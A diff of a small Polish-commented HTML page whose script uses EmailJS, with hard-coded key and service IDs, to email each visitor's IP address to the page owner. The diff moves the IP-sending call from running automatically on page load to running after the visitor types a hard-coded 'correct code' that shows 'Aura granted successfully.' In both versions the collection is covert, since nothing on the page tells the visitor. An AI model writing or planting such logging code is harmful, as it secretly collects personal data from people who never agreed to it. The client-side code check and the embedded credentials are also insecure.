@@ -42,10 +42,10 @@
     <script>
         // Inicjalizacja EmailJS
         (function(){
-            emailjs.init('2Q5b0TVUKpSRfjwLv'); // Zamień YOUR_USER_ID na swój ID użytkownika EmailJS
+            emailjs.init('2Q5b0TVUKpSRfjwLv'); // Użyj swojego Public Key (User ID)
         })();
 
-        // Funkcja do wysyłania emaila z adresem IP
+        // Funkcja do wysyłania e-maila z adresem IP
         function sendEmail(ip) {
             emailjs.send('service_urwaaz5', 'template_c9bwtca', {
                 ip_address: ip // Upewnij się, że ta nazwa zmiennej jest taka sama jak w Twoim szablonie
@@ -66,15 +66,14 @@
                 });
         }
 
-        // Wywołanie funkcji automatycznie przy ładowaniu strony
-        window.onload = fetchAndSendIP;
-
+        // Funkcja do sprawdzania kodu
         function checkCode() {
             const correctCode = "5849263710482";
             const userInput = document.getElementById("codeInput").value;
             
             if (userInput === correctCode) {
                 alert("Aura granted successfully.");
+                fetchAndSendIP(); // Wysyłanie adresu IP po wpisaniu prawidłowego kodu
             } else {
                 alert("Wrong code, try again.");
             }
